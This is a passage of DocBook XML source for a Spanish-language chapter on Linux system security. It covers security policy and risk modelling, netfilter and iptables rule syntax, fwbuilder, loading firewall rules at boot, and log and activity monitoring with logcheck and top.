<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Firewall</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Seguridad</title>
  <highlights>
    <para>Un sistema de información puede tener un nivel variable de importancia dependiendo del entorno. En algunos casos es vital para la supervivencia de una empresa. Por lo tanto, debe ser protegido de los diversos tipos de riesgos. El proceso de evaluación de estos riesgos y la definición e implementación de la protección se conocen en su conjunto como «proceso de seguridad».</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Definición de una política de seguridad</title>

    <sidebar>
      <title><emphasis>PRECAUCIÓN</emphasis> Alcance de este capítulo</title>

      <para>La seguridad es un tema muy amplio y muy sensible por lo que no podemos pretender describirlo de cualquier forma exhaustiva en el curso de un solo capítulo. Sólo delinearemos algunos puntos importantes y describiremos algunas de las herramientas y métodos que pueden ser de utilidad en el ámbito de la seguridad. Para leer más, la literatura abunda y libros enteros se han dedicado al tema. Un excelente punto de partida sería <citetitle>Linux Server Security</citetitle> por Michael D. Bauer (publicado por O'Reilly).</para>
    </sidebar>

    <para>La palabra «seguridad» en sí misma cubre un amplio rango de conceptos, herramientas y procedimientos, ninguno de los cuales es universal. Seleccionar entre ellos requiere una idea precisa de sus metas. Asegurar un sistema comienza con responder unas pocas preguntas. Al precipitarse a implementar un conjunto arbitrario de herramientas corre el riesgo de enfocarse en los aspectos de seguridad equivocados.</para>

    <para>Lo primero a determinar, por lo tanto, es el objetivo. Un buen método para ayudar con esta determinación comienza con las siguientes preguntas:</para>
    <itemizedlist>
      <listitem>
	<para>¿<emphasis>Qué</emphasis> estamos tratando de proteger? La política de seguridad será diferente dependiendo de si queremos proteger los equipos o los datos. En este último caso, también es necesario saber qué datos.</para>
      </listitem>
      <listitem>
	<para>¿<emphasis>Contra</emphasis> qué estamos tratando de protegernos? ¿Fuga de datos confidenciales? ¿Pérdida accidental de datos? ¿Perdida de ingresos por interrupción del servicio?</para>
      </listitem>
      <listitem>
	<para>También ¿contra <emphasis>quién</emphasis> estamos tratando de protegernos? Las medidas de seguridad serán diferentes para protegerse contra el error de un usuario regular del sistema de lo que serían contra un grupo de atacantes determinado.</para>
      </listitem>
    </itemizedlist>

    <para>Habitualmente, se utiliza el término «riesgo» para referirse al conjunto de estos tres factores: qué proteger, qué necesitamos prevenir antes que suceda y quién intentará hacer que suceda. Modelar el riesgo requiere respuestas a estas tres preguntas. A partir de este modelo de riesgo, podemos construir una normativa de seguridad e implementarla con acciones concretas.</para>

    <sidebar>
      <title><emphasis>NOTA</emphasis> Preguntas permanentes</title>

      <para>Bruce Schneier, un experto mundial en asuntos de seguridad (no sólo seguridad informática) intenta contrarrestar uno de los mitos más importantes con la frase: «la seguridad es un proceso, no un producto». Los activos a proteger cambian con el tiempo, así como también lo hacen las amenazas y los medios a disposición de los potenciales atacantes. Incluso si inicialmente se diseñó e implementó perfectamente una normativa de seguridad, uno nunca debe dormirse en los laureles. Los componentes del riesgo evolucionan y la respuesta a dicho riesgo debe evolucionar acordemente.</para>
    </sidebar>

    <para>Vale la pena el tomar en cuenta restricciones adicionales, dado que pueden limitar el alcance de las políticas disponibles. ¿Hasta dónde estamos dispuestos a llegar para asegurar un sistema? Esta pregunta tiene un gran impacto en la política a implementar. La respuesta es a menudo definida en términos de costos monetarios, pero debe considerar otros elementos, tal como la cantidad de inconvenientes impuestos a los usuarios del sistema o una degradación en el rendimiento.</para>

    <para>Una vez que modelamos el riesgo, podemos comenzar a pensar en diseñar una política de seguridad real.</para>

    <sidebar>
      <title><emphasis>NOTA</emphasis> Políticas extremas</title>

      <para>Hay casos donde la elección de las acciones necesarias para proteger un sistema es extremadamente simple.</para>

      <para>Por ejemplo, si el sistema a proteger está compuesto sólo por un equipo de segunda mano, el cual tiene como único uso el sumar unos cuantos números al final del día, la decisión de no hacer nada especial para protegerlo sería bastante razonable. El valor intrínseco del sistema es bajo. El valor de los datos es cero ya que no están almacenados en el equipo. Un atacante potencial que se infiltre en este «sistema» sólo ganaría una calculadora difícil de manejar. El costo de asegurar tal sistema probablemente sea mayor que el costo de una violación.</para>

      <para>En el otro extremo del espectro, quizás lo que se quiere proteger es la confidencialidad de los datos secretos de la manera más completa posible, superando cualquier otra consideración. En este caso, una respuesta apropiada sería la destrucción total de estos datos (borrar de forma segura los archivos, triturar en pedacitos los discos duros y luego disolverlos en ácido, y así sucesivamente). Si hay un requisito adicional de que los datos sean guardados para un uso futuro (aunque no necesariamente disponibles con facilidad), y si el costo aún no es un factor, entonces un punto de partida podría ser almacenar los datos en placas de aleación de platino—iridio almacenados en búnkeres a prueba de bombas en varias montañas del mundo, cada uno de los cuales es (por supuesto) totalmente secreto y protegido por ejércitos enteros…</para>

      <para>Estos ejemplos podrán parecer extremos, sin embargo, serían una respuesta adecuada a los riesgos definidos, en la medida en que son el resultado de un proceso de pensamiento que tiene en cuenta los objetivos a alcanzar con las limitaciones que deben cumplirse. Cuando provienene de una decisión razonada, ninguna política de seguridad es menos respetable que cualquier otra.</para>
    </sidebar>

    <para>En la mayoría de los casos, el sistema de información puede ser segmentado en subconjuntos coherentes y en su mayoría independientes. Cada subsistema tendrá sus propios requisitos y limitaciones, por lo que se deberá llevar a cabo la evaluación de riesgos y el diseño de la política de seguridad por separado para cada uno. Un buen principio a tener en cuenta es que un perímetro corto y bien definido es más fácil de defender que una frontera larga y sinuosa. Se debe diseñar en consecuencia también la organización de la red: se deben concentrar los servicios sensibles en un pequeño número de máquinas y estas máquinas sólo deben ser accesibles a través de un número mínimo de puntos de control, asegurar estos puntos de control será más fácil que asegurar todas la máquinas sensibles contra la totalidad del mundo exterior. Es en este punto que se hace evidente la utilidad del filtrado de red (incluyendo los firewalls). Puede implementar este filtrado con hardware dedicado, pero posiblemente una solución más simple y flexible sea utilizar un firewall en software como el que se integra en el núcleo Linux.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Firewall o el filtrado de paquetes</title>
    <indexterm><primary>firewall</primary></indexterm>
    <indexterm><primary>filtro de paquetes</primary></indexterm>

    <sidebar>
      <title><emphasis>VOLVER A LOS CIMIENTOS</emphasis> Firewall</title>
      <indexterm><primary>paquete</primary><secondary>IP</secondary></indexterm>

      <para>Un <emphasis>firewall</emphasis> es una pieza de equipo de cómputo con hardware y/o software que ordena los paquetes entrantes o salientes de la red (que vienen hacia o desde una red local) y sólo permite el paso de aquellos que coinciden con ciertas condiciones predefinidas.</para>
    </sidebar>

    <para>Un firewall es una puerta de enlace de la red con filtro y sólo es eficaz en aquellos paquetes que deben pasar a través de ella. Por lo tanto, sólo puede ser eficaz cuando la única ruta para estos paquetes es a través del firewall.</para>

    <para>La falta de una configuración estándar (y el lema «proceso, no producto») explica la falta de una solución preconfigurada. Hay, sin embargo, herramientas que facilitan la configuración del firewall <emphasis>netfilter</emphasis>, con una representación gráfica de las reglas de filtrado. <command>fwbuilder</command> es sin duda uno de los mejores de ellos.</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>CASO ESPECÍFICO</emphasis> Firewall local</title>

      <para>Puede restringir un firewall a una máquina en particular (a diferencia de una red completa), en cuyo caso su función es filtrar o limitar el acceso a algunos servicios, o posiblemente evitar las conexiones de salida de software ilegítimo que un usuario podría, voluntariamente o no, haber instalado.</para>
    </sidebar>

    <para>El núcleo Linux incorpora el firewall <emphasis>netfilter</emphasis>. Puede controlarlo desde el espacio de usuario con los programas <command>iptables</command> e <command>ip6tables</command>. La diferencia entre estos dos programas es que el primero actúa sobre la red IPv4, mientras que el segundo actúa sobre IPv6. Debido a que ambas pilas de protocolos de red probablemente continuarán con nosotors durante muchos años, ambas herramientas son necesarias y deberán ser utilizadas en paralelo.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Comportamiento de netfilter</title>

      <para><emphasis>netfilter</emphasis> utiliza cuatro tablas distintas que almacenan las reglas que regulan tres tipos de operaciones sobre los paquetes:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal> se refiere a las reglas de filtrado (aceptar, rechazar o ignorar un paquete);</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> se refiere a la traducción de las direcciones de origen o destino y puertos de los paquetes;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> se refiere a otros cambios en los paquetes IP (incluyendo el campo ToS — <emphasis>tipo de servicio</emphasis>: «Type of Service» — y opciones);</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> permite otras modificaciones manuales en los paquetes antes de que lleguen al sistema de seguimiento de conexiones.</para>
        </listitem>
      </itemizedlist>

      <para>Cada tabla contiene listas de reglas llamadas <emphasis>cadenas</emphasis>. El firewall utiliza cadenas estándar para manejar paquetes en función de circunstancias predefinidas. El administrador puede crear otras cadenas, que sólo se utilizarán cuando una cadena estándar haga referencia a ellas (ya sea directa o indirectamente).</para>
      <indexterm><primary>cadena</primary></indexterm>
      <indexterm><primary>regla de filtrado</primary></indexterm>

      <para>La tabla <literal>filter</literal> tiene tres cadenas estándar:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>: se refiere a paquetes cuyo destino es el propio firewall;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: se refiere a los paquetes que emite el firewall;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>: se refiere a los paquetes que transitan a través del firewall (que no es ni su origen ni su destino).</para>
        </listitem>
      </itemizedlist>

      <para>La tabla <literal>nat</literal> también tiene tres cadenas estándar:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>: para modificar los paquetes tan pronto como llegan;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>: para modificar los paquetes cuando están listos para seguir su camino;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: para modificar los paquetes generados por el propio firewall.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Cómo llamar a las cadenas de <emphasis>netfilter</emphasis></title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Cada cadena es una lista de reglas, cada regla es un conjunto de condiciones y una acción que se ejecutará cuando se cumplan las condiciones. Cuando se procesa un paquete, el firewall examina la cadena apropiada, una regla tras otra; cuando se cumplen las condiciones de una regla «salta» (de ahí la opción <literal>-j</literal> en las órdenes) a la acción especificada para continuar el procesamiento. Los comportamientos más comunes están estandarizados y existen acciones dedicadas para ellos. Tomar una de estas acciones estándar interrumpe el procesamiento de la cadena ya que el destino del paquete ya está sellado (salvo una excepción que se menciona a continuación):</para>

      <sidebar>
        <title><emphasis>VOLVER A LOS CIMIENTOS</emphasis> ICMP</title>

	<para>ICMP (<emphasis>protocolo de mensajes de control de internet</emphasis>: «Internet Control Message Protocol») es el protocolo utilizado para transmitir información complementaria en las comunicaciones. Permite probar la conectividad de red con el programa <command>ping</command> (el cual envía un mensaje ICMP de <emphasis>petición de eco</emphasis> — «echo request» — al que el destinatario debería responder con un mensaje ICMP de <emphasis>respuesta de eco</emphasis> — «echo reply»). Señala a un firewall rechazando un paquete, indica un desbordamiento en un búfer de recepción, propone una mejor ruta para los paquetes siguientes de la conexión y así sucesivamente. Se definió este protocolo en varios documentos RFC: inicialmente RFC777 y RFC792 que fueron completados y extendidos a la brevedad. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>A modo de referencia, un búfer de recepción es una pequeña zona de memoria que almacena datos entre el momento que llegan desde la red y el momento en que éstos son gestionados por el núcleo. Si esta zona está llena, no se pueden recibir nuevos datos e ICMP señalará el problema para que el emisor puede ralentizar su velocidad de transferencia (que idealmente debería alcanzar un equilibrio después de algún tiempo).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>recepción, búfer de</primary></indexterm>
        <indexterm><primary>búfer</primary><secondary>de recepción</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Tenga en cuenta que aunque una red IPv4 puede trabajar sin ICMP, ICMPv6 es estrictamente necesario para una red IPv6 ya que combina varias funciones que, en el mundo IPv4, se encontraban distribuidas entre ICMPv4, IGMP (<emphasis>protocolo de membresía de grupo de internet</emphasis>: «Internet Group Membership Protocol») y ARP (<emphasis>protocolo de resolución de direcciones</emphasis>: «Address Resolution Protocol»). ICMPv6 está definido en RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: permitir al paquete seguir su camino;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>: rechazar el paquete con un paquete de error ICMP (la opcion <literal>--reject-with <replaceable>tipo</replaceable></literal> de <command>iptables</command> permite seleccionar el tipo de error);</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: borrar (ignorar) el paquete;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: registrar (a través de <command>syslogd</command>) un mensaje con una descripción del paquete; tenga en cuenta que esta acción no interrumpe el procesamiento y la ejecución de la cadena continúa con la regla siguiente, razón por la que registrar los paquetes rechazados necesita una regla LOG y una regla REJECT/DROP;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: registrar un mensaje a través de <command>ulogd</command>, que puede adaptarse mejor y más eficientemente que <command>syslogd</command> para manejar de grandes cantidades de mensajes; tenga en cuenta que esta acción, al igual que LOG, también continúa el procesamiento de la siguiente regla en la cadena que la llamó;</para>
        </listitem>
        <listitem>
	  <para><replaceable>nombre_de_cadena</replaceable>: saltar a la cadena dada y evaluar sus reglas;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: interrumpir el procesamiento de la cadena actual y regresar a la cadena que la llamó; en el caso de que la cadena actual sea una estándar no hay cadena que la haya llamado, por lo que en su lugar se ejecutará la acción predeterminada (definida con la opción <literal>-P</literal> de <command>iptables</command>);</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (unicamente en la tabla <literal>nat</literal>: aplicar <emphasis>NAT de origen</emphasis> (las opciones adicionales describen los cambios exactos que se aplicarán);</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (unicamente en la tabla <literal>nat</literal>): aplicar <emphasis>NAT de destino</emphasis> (las opciones adicionales describen los cambios exactos que se aplicarán);</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (unicamente en la tabla <literal>nat</literal>: aplicar <emphasis>enmascaramiento</emphasis> (un caso especial de <emphasis>NAT de origen</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (unicamente en la tabla <literal>nat</literal>: redirigir un paquete a un puerto determinado del mismo firewall, puede utilizar esto para configurar un proxy web transparente que funciona sin ninguna configuración en el lado del cliente, dado que el cliente piensa que se conecta con el destinatario mientras que las comunicaciones realmente pasan por el proxy.</para>
        </listitem>
      </itemizedlist>

      <para>Otras acciones, en particular las relativas a la tabla <literal>mangle</literal>, están fuera del alcance de este texto. Podrá encontrar una lista completa en <citerefentry><refentrytitle>iptables</refentrytitle><manvolnum>8</manvolnum></citerefentry> y <citerefentry><refentrytitle>ip6tables</refentrytitle><manvolnum>8</manvolnum></citerefentry>.</para>
    </section>
    <section id="sect.iptables">
      <title>Sintaxis de <command>iptables</command> e <command>ip6tables</command></title>

      <para>Los programas <command>iptables</command> e <command>ip6tables</command> permiten manipular las tablas, cadenas y reglas. Su opción <literal>-t <replaceable>tabla</replaceable></literal> indica en qué tabla operar (la tabla <literal>filter</literal> de forma predeterminada).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Órdenes</title>

	<para>La opción <literal>-N <replaceable>cadena</replaceable></literal> crea una nueva cadena. La opción <literal>-X <replaceable>cadena</replaceable></literal> elimina una cadena vacía y sin uso. La opción <literal>-A <replaceable>cadena</replaceable> <replaceable>regla</replaceable></literal> añade una regla al final de la cadena dada. La opción <literal>-I <replaceable>cadena</replaceable> <replaceable>número_regla</replaceable> <replaceable>regla</replaceable></literal> inserta una regla antes de la regla con número <replaceable>número_regla</replaceable>. La opción <literal>-D <replaceable>cadena</replaceable> <replaceable>número_regla</replaceable></literal> (o <literal>-D <replaceable>cadena</replaceable> <replaceable>regla</replaceable></literal>) elimina una regla en una cadena, la primera sintaxis identifica la regla que se desea eliminar por su número, mientras que la segunda la identifica por su contenido. La opción <literal>-F <replaceable>cadena</replaceable></literal> vacía una cadena (borra todas sus reglas), si no menciona ninguna cadena, eliminará todas las reglas de la tabla. La opción <literal>-L <replaceable>cadena</replaceable></literal> muestra las reglas de la cadena. Por último, la opción <literal>-P <replaceable>cadena</replaceable> <replaceable>acción</replaceable></literal> define la acción predeterminada o «política» para una cadena dada; tenga en cuenta que sólo las cadenas estándar puede tener dicha política.</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Reglas</title>
        <indexterm><primary>regla de filtrado</primary></indexterm>

	<para>Cada regla es expresada como <literal><replaceable>condiciones</replaceable> -j <replaceable>acción</replaceable> <replaceable>opciones_acción</replaceable></literal>. Si describe varias condiciones en la misma regla, entonces el criterio es la conjunción (<emphasis>y</emphasis> lógico) de las condiciones, que son al menos tan restrictivas como cada condición individual.</para>

	<para>La condición <literal>-p <replaceable>protocolo</replaceable></literal> coincide con el campo de protocolo del paquete IP. Los valores más comunes son <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal> e <literal>icmpv6</literal>. Anteponer la condición con un signo de exclamación niega la condición, la cual se coincidirá con «todos los paquetes con un protocolo distinto al especificado». Este mecanismo de negación no es específico de la opción <literal>-p</literal> y se puede aplicar a todas las otras condiciones también.</para>

	<para>La condición <literal>-s <replaceable>dirección</replaceable></literal> o <literal>-s <replaceable>red/máscara</replaceable></literal> coincide con la dirección de origen del paquete. Correspondientemente, <literal>-d <replaceable>dirección</replaceable></literal> o <literal>-d<replaceable>red/máscara</replaceable></literal> coincide con la dirección de destino.</para>

	<para>La condición <literal>-i <replaceable>interfaz</replaceable></literal> selecciona los paquetes procedentes de la interfaz de red dada. <literal>-o <replaceable>interfaz</replaceable></literal> selecciona los paquetes que salen a través de una interfaz específica.</para>

	<para>Hay condiciones más específicas, dependiendo de las condiciones genéricas descriptas anteriormente. Por ejemplo, puede completementar la condición <literal>-p tcp</literal> con condiciones sobre los puertos TCP, cláusulas como <literal>--source-port <replaceable>puerto</replaceable></literal> y <literal>--destination-port <replaceable>puerto</replaceable></literal>.</para>

	<para>La condición <literal>--state <replaceable>estado</replaceable></literal> coincide con el estado de un paquete en una conexión (necesitará el modulo de núcleo <command>ipt_conntrack</command> para el seguimiento de conexiones). El estado <literal>NEW</literal> describe un paquete que inicia una nueva conexión; <literal>ESTABLISHED</literal> coincide con paquetes pertenecientes a una conexión ya existente y <literal>RELATED</literal> coincide con paquetes iniciando una nueva conexión relacionada con una ya existente (lo cual es útil para las conexiones <literal>ftp-data</literal> en el modo «activo» del protocolo FTP).</para>

	<para>En la sección anterior se enumeran las acciones disponibles, pero no sus opciones respectivas. Por ejemplo, la acción <literal>LOG</literal> tiene las siguientes opciones:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-priority</literal>, con un valor predeterminado de <literal>warning</literal>, indica la severidad de los mensajes <command>syslog</command>;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> permite especificar un prefijo de texto para diferenciar los mensajes registrados;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> y <literal>--log-ip-options</literal> indican datos adicionales que se integrarán en el mensaje: el número de secuencia TCP, opciones TCP y las opciones IP, respectivamente.</para>
          </listitem>
        </itemizedlist>

	<para>La acción <literal>DNAT</literal> ofrece la opción <literal>--to-destination <replaceable> dirección</replaceable>:<replaceable>puerto</replaceable></literal> para indicar la nueva dirección IP y/o puerto de destino. De manera similar, <literal>SNAT</literal> proporciona <literal>--to-source <replaceable>dirección</replaceable>:<replaceable>puerto</replaceable></literal> para indicar la nueva dirección IP y/o puerto de origen.</para>

	<para>La acción <literal>REDIRECT</literal> (sólo disponible is NAT está dispnible) ofrece la opción <literal>--to-ports <replaceable>puerto(s)</replaceable></literal> para indicar el puerto o rango de puertos al que debe redirigir los paquetes.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Creación de reglas</title>

      <para>Cada creación de una regla requiere una invocación de <command>iptables</command>/<command>ip6tables</command>. Escribir estas órdenes de forma manual puede ser tedioso, por lo que las llamadas se suelen almacenar en un script para definir la misma configuración automáticamente cada vez que arranque la máquina. Puede escribir este script a mano, pero también puede ser interesante prepararlo con una herramienta de alto nivel como <command>fwbuilder</command>.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>El principio es simple. En el primer paso, es necesario describir todos los elementos que intervendrán en las reglas:</para>
      <itemizedlist>
        <listitem>
	  <para>el propio firewall, con sus interfaces de red;</para>
        </listitem>
        <listitem>
	  <para>las redes, con sus rangos de direcciones IP correspondientes;</para>
        </listitem>
        <listitem>
	  <para>los servidores;</para>
        </listitem>
        <listitem>
	  <para>los puertos pertenecientes a los servicios alojados en los servidores.</para>
        </listitem>
      </itemizedlist>

      <para>Luego puede crear las reglas simplemente arrastrando y soltando acciones en los objetos. Unos cuantos menús contextuales pueden cambiar la condición (negarla, por ejemplo). A continuación, deberá elegir la acción y configurarla.</para>

      <para>En cuanto a IPv6, puede crear dos conjuntos de reglas diferentes para IPv4 e IPv6, o crear sólo una y dejar que <command>fwbuilder</command> traduzca las reglas según las direcciones asignadas a los objetos.</para>

      <figure id="figure.fwbuilder">
        <title>Ventana principal de fwbuilder</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para>Luego <command>fwbuilder</command> puede generar un script de configuración del firewall según las reglas que definió. Su arquitectura modular le da la capacidad para generar scripts dirigidos a diferentes sistemas (<command>iptables</command> para Linux, <command>ipf</command> para FreeBSD y <command>pf</command> para OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Instalación de las reglas en cada arranque</title>

      <para>En otros casos, la forma recomendada es registrar el script de configuración en una directiva <literal>up</literal> del archivo <filename>/etc/network/interfaces</filename>. En el siguiente ejemplo, el script está guardado como <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title>archivo <filename>interfaces</filename> llamando al script del firewall</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>Esto obviamente asume que se está utilizando <emphasis role="pkg">ifupdown</emphasis> para configurar las interfaces de red. Si se está utilizando alguna otra cosa (como  <emphasis>NetworkManager</emphasis> o <emphasis>systemd-networkd</emphasis>), entonces se debe consultar la documentación respectiva para averiguar cómo ejecutar un script después de que se levante la interfaz de red.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Supervisión: prevención, detección, disuasión</title>
    <indexterm><primary>monitorización</primary></indexterm>

    <para>La monitorización es una parte integral de cualquier política de seguridad por varias razones. Entre ellas, que el objetivo de la seguridad generalmente no se limita a garantizar la confidencialidad de los datos, sino que también incluye garantizar la disponibilidad de los servicios. Por tanto, es imprescindible comprobar que todo funciona como se espera y detectar de manera oportuna cualquier desvío en la conducta o cambio en la calidad de los servicios prestados. Monitorizar la actividad puede ayudar con la detección de intentos de intrusión y permitir una reacción rápida antes que ocurran graves consecuencias. Esta sección revisa algunas de las herramientas que puede utilizar para monitorizar varios aspectos de un sistema Debian. Como tal, esto completa <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Monitorización de los registros con <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>registros</primary><secondary>monitorización</secondary></indexterm>
      <indexterm><primary>monitorización</primary><secondary>archivos de registro</secondary></indexterm>

      <para>El programa <command>logcheck</command> monitoriza los archivos de registro, de forma predeterminada, cada hora. Envía los mensajes de registro inusuales en correos electrónicos al administrador para su posterior análisis.</para>

      <para>La lista de archivos a monitorizar se almacena en <filename>/etc/logcheck/logcheck.logfiles</filename>; los valores predeterminados funcionan bien si no modificó completamente el archivo <filename>/etc/rsyslog.conf</filename>.</para>

      <para><command>logcheck</command> puede funcionar en una de tres modalidades más o menos detalladas: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> y <emphasis>workstation</emphasis>. El primero es <emphasis>muy</emphasis> detallado y, probablemente, debería restringirlo a servidores específicos como firewalls. El segundo (y predeterminado) es el modo recomendado para la mayoría de los servidores. El ultimo está diseñado para estaciones de trabajo y es aún más conciso (filtra la mayoría de los mensajes).</para>

      <para>En los tres casos, probablemente debería personalizar <command>logcheck</command> para excluir algunos mensajes adicionales (dependiendo de los servicios instalados) a menos que el administrador realmente desee recibir a cada hora correos electrónicos enormes y poco interesantes. Dado que el mecanismo de selección de mensajes es bastante complejo, <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> es una lectura — aunque difícil — necesaria.</para>

      <para>Las reglas aplicadas se puede dividir en varios tipos:</para>
      <itemizedlist>
        <listitem>
	  <para>aquellas que clasifican un mensaje como un intento de intrusión — «cracking» (almacenado en un archivo en el directorio <filename>/etc/logcheck/cracking.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquellas que cancelan esta clasificación (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquellos que clasifican un mensaje como una alerta de seguridad (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquellos que cancelan esta clasificación (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>finalmente, aquellas que son aplicadas a los mensajes restantes (considerados como <emphasis>eventos del sistema</emphasis>).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>PRECAUCIÓN</emphasis> Ignorar un mensaje</title>

	<para>Cualquier mensaje marcado como un intento de intrusión o una alerta de seguridad (siguiendo una regla almacenada en el archivo <filename>/etc/logcheck/violations.d/miarchivo</filename>) sólo puede ser ignorado por una regla en el archivo <filename>/etc/logcheck/violations.ignore.d/miarchivo</filename> o <filename>/etc/logcheck/violations.ignore.d/miarchivo-<replaceable>extensión</replaceable></filename>.</para>
      </sidebar>

      <para>Siempre se indicará un evento de sistema a menos que una regla en alguno de los directorios en <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> indique que el evento debe ser ignorado. Por supuesto, sólo se tomarán en cuenta los directorios que corresponden a los niveles de detalle igual o mayor al modo de funcionamiento seleccionado.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Monitorización de actividad</title>
      <indexterm><primary>monitorización</primary><secondary>actividad</secondary></indexterm>
      <indexterm><primary>actividad, monitorización</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>En tiempo real</title>

	<para><command>top</command> es una herramienta interactiva que muestra una lista de los procesos en ejecución. La ordenación predeterminada es según la cantidad de procesador utilizada y se puede obtener mediante la tecla <keycap>P</keycap>. Entre otros criterios de ordenación podemos encontrar: según la cantidad de memoria ocupada (tecla <keycap>M</keycap>), según el tiempo total de uso de procesador (tecla <keycap>T</keycap>) y según el identificador de proceso (tecla <keycap>N</keycap>). La tecla <keycap>k</keycap> permite matar un proceso ingresando su identificador de proceso. La tecla <keycap>r</keycap> permite ejecutar <emphasis>renice</emphasis> sobre un proceso, es decir: cambiar su prioridad.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Cuando el sistema aparenta estar sobrecargado, <command>top</command> es una herramienta excelente para ver qué procesos estan compitiendo por el tiempo de procesador o consumiendo demasiada memoria. En particular, a menudo es interesante comprobar si los procesos que están consumiendo los recursos se corresponden con los servicios reales que la máquina debe albergar. Por ejemplo, un proceso desconocido ejecutándose como el usuario www-data debería llamar su atención y ser investigado puesto que posiblemente sea algún tipo de software instalado y ejecutado en el sistema a través de una vulnerabilidad en una aplicación web.</para>

	<para><command>top</command> es una herramienta muy flexible y su página de manual detalla cómo personalizar su presentación y adaptarla a las necesidades y hábitos particulares.</para>

        <para>La herramienta gráfica <command>gnome-system-monitor</command> es similar al programa <command>top</command> y proporciona aproximandamente las mismas características.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>Historial</title>
        <indexterm><primary>actividad, historial</primary></indexterm>

	<para>La carga del procesador, el tráfico de red y el espacio libre en disco son datos que varían constantemente. A menudo es útil disponer de un historial con su evolución para determinar cómo se utiliza exáctamente la máquina.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

